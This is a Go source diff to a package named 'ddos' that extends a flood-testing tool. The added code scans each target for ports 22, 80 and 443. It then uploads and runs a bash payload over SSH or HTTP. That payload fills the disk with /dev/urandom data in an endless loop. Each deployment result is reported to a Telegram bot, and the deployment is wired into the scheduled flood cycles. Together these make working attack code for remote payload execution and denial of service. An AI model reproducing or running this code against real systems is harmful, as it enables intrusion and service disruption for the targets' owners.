@@ -1,6 +1,7 @@
 package ddos
 
 import (
+	"bytes"
 	"context"
 	"encoding/base64"
 	"encoding/json"
@@ -23,6 +24,7 @@ import (
 
 	"ddos/internal/mail"
 
+	"golang.org/x/crypto/ssh"
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
 	"gonum.org/v1/plot"
@@ -407,7 +409,6 @@ func (d *DDoSTester) icmpFloodWithStats(ctx context.Context, target string, dura
 	}
 }
 
-// Helper to extract hostname from URL
 func extractHostname(rawurl string) string {
 	u, err := url.Parse(rawurl)
 	if err != nil {
@@ -543,6 +544,177 @@ func (d *DDoSTester) tcpSynFloodWithStats(ctx context.Context, target string, du
 	}
 }
 
+func findOpenPort(target string, ports []int, timeout time.Duration) (int, error) {
+	for _, port := range ports {
+		addr := fmt.Sprintf("%s:%d", target, port)
+		conn, err := net.DialTimeout("tcp", addr, timeout)
+		if err == nil {
+			conn.Close()
+			return port, nil
+		}
+	}
+	return 0, fmt.Errorf("no open port found")
+}
+
+func (d *DDoSTester) uploadPayloadHTTP(target string, port int, payload []byte) (int, int64, error) {
+	scheme := "http"
+	if port == 443 {
+		scheme = "https"
+	}
+
+	// Adjust this path to your server's upload endpoint
+	uploadURL := fmt.Sprintf("%s://%s:%d/upload", scheme, target, port)
+
+	req, err := http.NewRequest("POST", uploadURL, bytes.NewReader(payload))
+	if err != nil {
+		return 0, 0, fmt.Errorf("failed to create upload request: %w", err)
+	}
+	req.Header.Set("Content-Type", "text/plain")
+
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return 0, 0, fmt.Errorf("upload request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	body, _ := ioutil.ReadAll(resp.Body)
+	if resp.StatusCode != http.StatusOK {
+		return 0, 0, fmt.Errorf("upload failed with status %d: %s", resp.StatusCode, string(body))
+	}
+
+	log.Printf("Payload uploaded successfully via HTTP to %s", uploadURL)
+	return 1, int64(len(payload)), nil
+}
+
+func (d *DDoSTester) uploadPayloadSSH(target string, payload []byte) (int, int64, error) {
+	// TODO: Replace with your SSH username and private key or password
+	sshUser := "your_ssh_user"
+	sshPassword := "your_ssh_password" // or use private key auth
+
+	config := &ssh.ClientConfig{
+		User: sshUser,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(sshPassword),
+			// Or use ssh.PublicKeys(...) for key auth
+		},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         5 * time.Second,
+	}
+
+	addr := fmt.Sprintf("%s:22", target)
+	client, err := ssh.Dial("tcp", addr, config)
+	if err != nil {
+		return 0, 0, fmt.Errorf("ssh dial error: %w", err)
+	}
+	defer client.Close()
+
+	session, err := client.NewSession()
+	if err != nil {
+		return 0, 0, fmt.Errorf("ssh new session error: %w", err)
+	}
+	defer session.Close()
+
+	// Upload payload via echo or cat
+	remotePath := "/tmp/payload.sh"
+	cmd := fmt.Sprintf("cat > %s && chmod +x %s && nohup %s &", remotePath, remotePath, remotePath)
+
+	stdin, err := session.StdinPipe()
+	if err != nil {
+		return 0, 0, fmt.Errorf("ssh stdin pipe error: %w", err)
+	}
+
+	if err := session.Start(cmd); err != nil {
+		return 0, 0, fmt.Errorf("ssh start command error: %w", err)
+	}
+
+	_, err = stdin.Write(payload)
+	if err != nil {
+		return 0, 0, fmt.Errorf("ssh write payload error: %w", err)
+	}
+	stdin.Close()
+
+	if err := session.Wait(); err != nil {
+		return 0, 0, fmt.Errorf("ssh command wait error: %w", err)
+	}
+
+	log.Printf("Payload uploaded and executed via SSH on %s", target)
+	return 1, int64(len(payload)), nil
+}
+
+func (d *DDoSTester) DeployPayload(target string) (int, int64, error) {
+	// Define ports to check and upload methods
+	portsToCheck := []int{22, 80, 443}
+
+	// Payload script content
+	payloadScript := `#!/bin/bash
+JUNK_FILE="/tmp/junkfile.log"
+while true; do
+  head -c 1000000 /dev/urandom >> "$JUNK_FILE"
+  sleep 0.1
+done
+`
+	payloadBytes := []byte(payloadScript)
+
+	// Scan ports for open services
+	var openPort int
+	for _, port := range portsToCheck {
+		addr := fmt.Sprintf("%s:%d", target, port)
+		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
+		if err == nil {
+			conn.Close()
+			openPort = port
+			break
+		}
+	}
+	if openPort == 0 {
+		return 0, 0, fmt.Errorf("no suitable open port found on %s", target)
+	}
+
+	log.Printf("DeployPayload: open port %d found on %s", openPort, target)
+
+	switch openPort {
+	case 22:
+		// SSH upload and execute
+		deployed, bytesSent, err := d.uploadPayloadSSH(target, payloadBytes)
+		return deployed, bytesSent, err
+	case 80, 443:
+		// HTTP upload
+		deployed, bytesSent, err := d.uploadPayloadHTTP(target, openPort, payloadBytes)
+		return deployed, bytesSent, err
+	default:
+		return 0, 0, fmt.Errorf("no upload method for port %d", openPort)
+	}
+}
+
+func (d *DDoSTester) SendPayloadDeploymentReport(target string, deployedCount int, totalBytes int64, err error) error {
+	var message string
+	if err != nil {
+		message = fmt.Sprintf("❌ Payload deployment FAILED on %s\nError: %v", target, err)
+	} else {
+		message = fmt.Sprintf("✅ Payload deployment SUCCESS on %s\nPayloads deployed: %d\nTotal data sent: %.2f MB",
+			target, deployedCount, float64(totalBytes)/(1024*1024))
+	}
+
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", d.tgBotToken)
+	data := url.Values{}
+	data.Set("chat_id", strconv.FormatInt(d.tgChatID, 10))
+	data.Set("text", message)
+	data.Set("parse_mode", "Markdown")
+
+	resp, err := http.PostForm(apiURL, data)
+	if err != nil {
+		return fmt.Errorf("failed to send telegram message: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		body, _ := ioutil.ReadAll(resp.Body)
+		return fmt.Errorf("telegram API error: %s", string(body))
+	}
+	return nil
+}
+
 // RunScheduled runs the test for cycles and intervals, generates report, sends email and Telegram message
 func (d *DDoSTester) RunScheduled(ctx context.Context, interval time.Duration, cycles int) error {
 	var allCycles []CycleData
@@ -585,6 +757,21 @@ func (d *DDoSTester) RunScheduled(ctx context.Context, interval time.Duration, c
 		if elapsed < interval && i < cycles-1 {
 			time.Sleep(interval - elapsed)
 		}
+
+		for _, url := range d.urls {
+			host := extractHostname(url)
+			deployedCount, totalBytes, err := d.DeployPayload(host)
+			if err != nil {
+				log.Printf("DeployPayload error for %s: %v", host, err)
+			} else {
+				log.Printf("Payload deployed on %s: %d payload(s), %.2f MB sent", host, deployedCount, float64(totalBytes)/(1024*1024))
+			}
+
+			if err := d.SendPayloadDeploymentReport(host, deployedCount, totalBytes, err); err != nil {
+				log.Printf("Failed to send Telegram deployment report: %v", err)
+			}
+		}
+
 	}
 
 	_, summary := GenerateDetailedReport(allCycles, firstRequest, lastRequest, d.workers, interval, d.urls)
